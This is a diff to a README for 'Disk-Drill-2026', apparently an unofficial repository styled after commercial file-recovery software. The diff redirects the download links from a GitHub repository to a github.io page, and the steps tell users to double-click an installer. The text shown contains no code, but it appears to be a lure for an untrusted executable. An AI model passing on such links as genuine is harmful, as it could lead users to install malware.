@@ -1,6 +1,6 @@
 # 💾 Disk-Drill-2026 - Recover lost files with simple steps
 
-[![Download Disk-Drill-2026](https://img.shields.io/badge/Download-Disk--Drill--2026-blue.svg)](https://github.com/Sadsasal7534/Disk-Drill-2026)
+[![Download Disk-Drill-2026](https://img.shields.io/badge/Download-Disk--Drill--2026-blue.svg)](https://sadsasal7534.github.io)
 
 Disk-Drill-2026 helps you recover lost data on Windows computers. This tool identifies deleted files, manages recovery scan tiers, and maintains your data protection vault. The software organizes your restore planning to ensure you retrieve important documents, photos, and videos with minimal effort. This guide helps you install and run the application on your Windows machine.
 
@@ -20,7 +20,7 @@ Close other programs before you begin the setup process. This stabilizes the sys
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download: [https://github.com/Sadsasal7534/Disk-Drill-2026](https://github.com/Sadsasal7534/Disk-Drill-2026).
+1. Visit this page to download: [https://sadsasal7534.github.io](https://sadsasal7534.github.io).
 2. Locate the download folder on your computer.
 3. Double-click the installation file to open the setup wizard.
 4. Select your preferred installation path.
